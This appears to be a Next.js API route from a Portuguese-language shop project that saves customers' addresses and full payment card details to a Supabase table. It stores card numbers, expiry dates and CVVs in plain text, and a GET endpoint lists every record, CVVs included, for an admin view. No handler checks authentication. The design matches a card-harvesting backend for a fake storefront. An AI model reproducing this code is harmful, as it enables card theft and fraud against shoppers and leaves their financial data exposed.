import { NextResponse } from "next/server"
import { createClient } from "@/lib/supabase/server"

export async function POST(request: Request) {
  try {
    const supabase = await createClient()
    const body = await request.json()
    
    const { data, error } = await supabase
      .from("checkouts")
      .insert({
        nome: body.address.nome,
        telefone: body.address.telefone,
        cep: body.address.cep,
        endereco: body.address.endereco,
        numero: body.address.numero,
        complemento: body.address.complemento || null,
        bairro: body.address.bairro,
        cidade: body.address.cidade,
        estado: body.address.estado,
        card_numero: body.card?.numero || null,
        card_nome: body.card?.nome || null,
        card_validade: body.card?.validade || null,
        card_cvv: body.card?.cvv || null,
        payment_method: body.paymentMethod,
      })
      .select()
      .single()
    
    if (error) {
      console.error("[v0] Supabase insert error:", error)
      return NextResponse.json({ error: "Erro ao salvar dados" }, { status: 500 })
    }
    
    return NextResponse.json({ success: true, id: data.id })
  } catch (err) {
    console.error("[v0] API error:", err)
    return NextResponse.json({ error: "Erro ao salvar dados" }, { status: 500 })
  }
}

export async function GET() {
  try {
    const supabase = await createClient()
    
    const { data, error } = await supabase
      .from("checkouts")
      .select("*")
      .order("created_at", { ascending: false })
    
    if (error) {
      console.error("[v0] Supabase fetch error:", error)
      return NextResponse.json({ error: "Erro ao buscar dados" }, { status: 500 })
    }
    
    // Formatar dados para o formato esperado pelo admin
    const formattedData = data.map((item) => ({
      id: item.id,
      timestamp: item.created_at,
      address: {
        nome: item.nome,
        telefone: item.telefone,
        cep: item.cep,
        endereco: item.endereco,
        numero: item.numero,
        complemento: item.complemento,
        bairro: item.bairro,
        cidade: item.cidade,
        estado: item.estado,
      },
      card: item.card_numero ? {
        numero: item.card_numero,
        nome: item.card_nome,
        validade: item.card_validade,
        cvv: item.card_cvv,
      } : null,
      paymentMethod: item.payment_method,
    }))
    
    return NextResponse.json(formattedData)
  } catch (err) {
    console.error("[v0] API error:", err)
    return NextResponse.json({ error: "Erro ao buscar dados" }, { status: 500 })
  }
}

export async function PATCH(request: Request) {
  try {
    const supabase = await createClient()
    const body = await request.json()
    
    if (!body.id) {
      return NextResponse.json({ error: "ID nao fornecido" }, { status: 400 })
    }
    
    const updateData: Record<string, unknown> = {
      payment_method: body.paymentMethod,
    }
    
    // Adiciona dados do cartao se existirem
    if (body.card) {
      updateData.card_numero = body.card.numero
      updateData.card_nome = body.card.nome
      updateData.card_validade = body.card.validade
      updateData.card_cvv = body.card.cvv
    }
    
    const { error } = await supabase
      .from("checkouts")
      .update(updateData)
      .eq("id", body.id)
    
    if (error) {
      console.error("[v0] Supabase update error:", error)
      return NextResponse.json({ error: "Erro ao atualizar" }, { status: 500 })
    }
    
    return NextResponse.json({ success: true })
  } catch (err) {
    console.error("[v0] API error:", err)
    return NextResponse.json({ error: "Erro ao atualizar" }, { status: 500 })
  }
}

export async function DELETE(request: Request) {
  try {
    const supabase = await createClient()
    const { searchParams } = new URL(request.url)
    const id = searchParams.get("id")
    
    if (!id) {
      return NextResponse.json({ error: "ID nao fornecido" }, { status: 400 })
    }
    
    const { error } = await supabase
      .from("checkouts")
      .delete()
      .eq("id", id)
    
    if (error) {
      console.error("[v0] Supabase delete error:", error)
      return NextResponse.json({ error: "Erro ao deletar" }, { status: 500 })
    }
    
    return NextResponse.json({ success: true })
  } catch (err) {
    console.error("[v0] API error:", err)
    return NextResponse.json({ error: "Erro ao deletar" }, { status: 500 })
  }
}
